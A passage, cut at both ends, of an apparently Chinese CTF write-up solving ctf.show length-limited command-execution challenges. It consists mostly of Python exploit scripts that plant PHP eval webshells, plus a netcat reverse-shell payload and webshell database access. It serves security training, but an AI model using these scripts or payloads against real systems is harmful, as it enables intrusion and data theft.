getimagesize(<span class="variable">$tmpname</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>) &amp;&amp; (<span class="variable">$ef</span>!=<span class="literal">false</span>) &amp;&amp; (<span class="variable">$ef</span>[<span class="string">&#x27;mime&#x27;</span>]==<span class="string">&#x27;image/jpeg&#x27;</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = base64_decode(file_get_contents(<span class="variable">$tmpname</span>));</span><br><span class="line">        file_put_contents(<span class="string">&quot;shell.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;file upload success!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据源码我们发现他会获得一些图片信息并比对，之后对图片进行base64解码，并将解码后获得的内容放入shell.php中<br>利用百度师傅构造的图片成功getshell<br><img src="https://img-blog.csdnimg.cn/dbf55b16d6a3448d944d98b31b5dcb70.png"></p>
<h1 id="web821（7字符RCE）"><a href="#web821（7字符RCE）" class="headerlink" title="web821（7字符RCE）"></a>web821（7字符RCE）</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/nzjdsds/article/details/102873187">7字符rce</a><br>原理如博客一样<br>利用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-05-06 13:25:41</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-05-10 20:55:01</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload=[</span><br><span class="line"><span class="string">&quot;&gt;hp&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;1.p\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;d\\&gt;\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;\\ -\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;e64\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;bas\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;7\\|\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;XSk\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;Fsx\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;dFV\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;kX0\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;bCg\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;XZh\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;AgZ\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;waH\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;PD9\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;o\\ \\&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;ech\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;ls -t&gt;0&quot;</span>,</span><br><span class="line"><span class="string">&quot;. 0&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeFile</span>(<span class="params">payload</span>):</span></span><br><span class="line">	data=&#123;</span><br><span class="line">	<span class="string">&quot;cmd&quot;</span>:payload</span><br><span class="line">	&#125;</span><br><span class="line">	requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">	<span class="keyword">for</span> p <span class="keyword">in</span> payload:</span><br><span class="line">		writeFile(p.strip())</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">		time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">	response = requests.get(url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	run()</span><br><span class="line">	check()</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>利用脚本可以插入木马文件<br>这里需要用get进行蚁剑连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a5efc927-2331-4a26-9c31-248e9b58a782.challenge.ctf.show/1.php?1=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);</span><br></pre></td></tr></table></figure>
<p>进行套娃连接蚁剑<br>之后利用蚁剑连接数据库<br><img src="https://img-blog.csdnimg.cn/9d9abc861a714d85bbc4a82a92581d7f.png"><br>之后添加数据库mysqli，账号密码位root<br>之后得到flag</p>
<h1 id="web822（7字符不可写）"><a href="#web822（7字符不可写）" class="headerlink" title="web822（7字符不可写）"></a>web822（7字符不可写）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag in database;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>) &lt;= <span class="number">7</span>)&#123;</span><br><span class="line">    shell_exec(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>本题目在web目录不可写<br>于是需要另一种方法<br>写到临时目录并执行它<br>(.表示执行一个sh脚本，使本身没有执行权限的脚本通过点可以执行，如果没要会报错)<br>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://9fabb83a-ac44-40d5-a91f-06d5f3339269.challenge.ctf.show/&quot;</span></span><br><span class="line">file=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">b&quot;nc vps port -e /bin/sh&quot;</span>&#125;</span><br><span class="line">data=&#123;<span class="string">&#x27;cmd&#x27;</span>:<span class="string">&#x27;. /t*/*&#x27;</span>&#125;</span><br><span class="line">test = requests.post(url=url,data=data,files=file)</span><br></pre></td></tr></table></figure>

<h1 id="web823（5字符可写，有dir）"><a href="#web823（5字符可写，有dir）" class="headerlink" title="web823（5字符可写，有dir）"></a>web823（5字符可写，有dir）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag in database;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>) &lt;= <span class="number">5</span>)&#123;</span><br><span class="line">    shell_exec(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>*可以将文件名作为命令进行执行<br><img src="https://img-blog.csdnimg.cn/625240093f2a42cb8a0ba332576948da.png"><br>最好将脚本中的5字符命令自己敲一下<br>如果压缩包里面有php命令可以直接php进行运行<br>利用脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-05-06 13:25:41</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-05-10 20:55:17</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://77e86d43-d65b-4635-8230-9214d4463ff2.challenge.ctf.show/&quot;</span></span><br><span class="line">url_2 = url+<span class="string">&quot;.php&quot;</span></span><br><span class="line">delay = <span class="number">0.3</span></span><br><span class="line"></span><br><span class="line">chagneFile_payload=[</span><br><span class="line"><span class="string">&#x27;&gt;cp&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;k&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm cp&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;pc&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;dir&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*v&gt;z&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sh z&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm k&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm z&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm pc&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm *v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;php.&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;j\\#&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;vm&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*v&gt;z&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sh z&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">clearFile_payload=[</span><br><span class="line"><span class="string">&#x27;rm d*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm j*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm p*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm r*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm v*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;rm z&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">shell_payload=[</span><br><span class="line"><span class="string">&#x27;&gt;tar&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;vcf&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;z&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">file=&#123;</span><br><span class="line">	<span class="string">&#x27;file&#x27;</span>:<span class="string">b&#x27;&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def changeFile():</span><br><span class="line">	<span class="keyword">for</span> p in chagneFile_payload:</span><br><span class="line">		sendPayload(url,p)</span><br><span class="line">		<span class="keyword">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">		time.sleep(delay)</span><br><span class="line"></span><br><span class="line">def clearFile():</span><br><span class="line">	<span class="keyword">for</span> p in clearFile_payload:</span><br><span class="line">		sendPayload(url_2,p)</span><br><span class="line">		<span class="keyword">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">		time.sleep(delay)</span><br><span class="line"></span><br><span class="line">def getshell():</span><br><span class="line">	<span class="keyword">for</span> p in shell_payload:</span><br><span class="line">		sendPayload(url_2,p)</span><br><span class="line">		<span class="keyword">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">		time.sleep(delay)</span><br><span class="line">	data=&#123;</span><br><span class="line">		<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;* /t*&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	requests.post(url_2,data=data,files=file)</span><br><span class="line">	data=&#123;</span><br><span class="line">		<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;php z&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	requests.post(url_2,data=data)</span><br><span class="line"></span><br><span class="line">def checkShell():</span><br><span class="line">	response = requests.get(url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line">		<span class="keyword">print</span>(<span class="string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line"></span><br><span class="line">def sendPayload(url,payload):</span><br><span class="line">	data=&#123;</span><br><span class="line">	<span class="string">&quot;cmd&quot;</span>:payload</span><br><span class="line">	&#125;</span><br><span class="line">	requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line">	changeFile()</span><br><span class="line">	clearFile()</span><br><span class="line">	getshell()</span><br><span class="line">	checkShell()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<h1 id="web824（5字符可写，无dir）"><a href="#web824（5字符可写，无dir）" class="headerlink" title="web824（5字符可写，无dir）"></a>web824（5字符可写，无dir）</h1><p>题目同上<br>写入grep h<br>接着执行* &gt; j<br>实际执行的是grep h index.php<br>得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    shell_exec(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
<p>之后将他cp到index.php，即<br>将j中的内容添加到index.php后面并且写入到i中<br>cat * &gt;&gt; i*<br>最后将i的copy到index.php中。<br>不过适用的情况不多，需要最终调用的命令带h或者p。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-05-06 13:25:41</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-05-10 20:55:28</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload=[</span><br><span class="line"><span class="string">&quot;&gt;grep&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;h&quot;</span>,</span><br><span class="line"><span class="string">&quot;*&gt;j&quot;</span>,</span><br><span class="line"><span class="string">&quot;rm g*&quot;</span>,</span><br><span class="line"><span class="string">&quot;rm h*&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;cat&quot;</span>,</span><br><span class="line"><span class="string">&quot;*&gt;&gt;i&quot;</span>,</span><br><span class="line"><span class="string">&quot;rm c*&quot;</span>,</span><br><span class="line"><span class="string">&quot;rm j&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;cp&quot;</span>,</span><br><span class="line"><span class="string">&quot;*&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def writeFile(payload):</span><br><span class="line">	data=&#123;</span><br><span class="line">	<span class="string">&quot;cmd&quot;</span>:payload</span><br><span class="line">	&#125;</span><br><span class="line">	requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line">	<span class="keyword">for</span> p in payload:</span><br><span class="line">		writeFile(p.strip())</span><br><span class="line">		<span class="keyword">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">		time.sleep(<span class="number">0.3</span>)</span><br><span class="line">	<span class="keyword">print</span>(<span class="string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>即可命令执行<br>（由于没有回显，可以在当前页面写一句话木马）</p>
<h1 id="web825（4字符，可写，有dir）"><a href="#web825（4字符，可写，有dir）" class="headerlink" title="web825（4字符，可写，有dir）"></a>web825（4字符，可写，有dir）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag in database;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>) &lt;= <span class="number">4</span>)&#123;</span><br><span class="line">    shell_exec(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>本题主要就是构造ls -t<br>可以利用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;sl&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;kt-&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;j\\&gt;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;j\\#&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;dir&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*v&gt;x&#x27;</span>,</span><br></pre></td></tr></table></figure>
<p>进行构造ls -t &gt; x中<br>之后执行x就行<br>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-05-06 13:25:41</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-05-10 